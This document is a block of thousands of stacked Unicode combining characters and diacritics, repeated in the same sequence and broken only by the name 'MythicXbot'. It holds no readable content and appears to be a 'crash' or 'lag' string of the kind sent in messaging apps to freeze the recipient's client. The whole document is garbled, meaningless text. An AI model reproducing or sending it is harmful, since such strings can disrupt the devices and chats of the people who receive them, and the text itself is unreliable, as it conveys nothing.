̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺ